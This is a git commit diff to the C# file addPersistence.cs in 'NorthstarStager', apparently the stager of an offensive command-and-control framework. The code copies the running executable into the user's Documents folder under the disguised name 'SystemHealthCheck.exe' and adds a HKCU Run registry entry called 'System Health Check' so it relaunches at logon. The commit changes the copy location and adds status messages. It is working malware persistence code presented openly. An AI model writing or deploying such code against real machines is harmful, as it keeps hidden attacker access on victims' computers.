b7dd9ba213a661b6217e2a8348250615240f290a
Engin <30810774+EnginDemirbilek@users.noreply.github.com>
2020-05-19 05:15:47 +0300

    Copy folder updated.

--- NorthstarStager/NorthstarStager/addPersistence.cs
+++ NorthstarStager/NorthstarStager/addPersistence.cs
@@ -1,4 +1,4 @@
-﻿using Microsoft.Win32;
+using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -13,11 +13,12 @@ namespace NorthStarStager
        
         static string fileNameSpace = "SystemHealthCheck.exe";
         string filePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-        string newFilePath =  Path.GetTempPath() + fileNameSpace;
+        string  newFilePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + fileNameSpace;
+        //string newFilePath =  Path.GetTempPath() + fileNameSpace;
         string keys = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run";
 
    
-        public void _addStartup()
+        private string _addStartup()
         {
           
                 try
@@ -33,29 +34,41 @@ namespace NorthStarStager
                             key.SetValue("System Health Check", "\"" + newFilePath + "\"");
                             key.Dispose();
                             key.Flush();
+                        return "Added to startup folder";
                         }
                     }
+                else
+                {
+                    return "Its already added to start-up folder";
+                }
 
                 }
                 catch
                 {
-
+                    return "An err occured.";
                 }
 
 
         }
 
-        public void _copyItSelf()
+        public string _copyItSelf()
         {
             if (!File.Exists(newFilePath))
             {
-                System.IO.File.Copy(filePath, newFilePath);
-                _addStartup();
+                try
+                {
+                    System.IO.File.Copy(filePath, newFilePath);
+                    return _addStartup();
+                }
+                catch
+                {
+                    return "An error occured";
+                }
               
             }
             else
             {
-                _addStartup();
+               return  _addStartup();
                 
             }
 
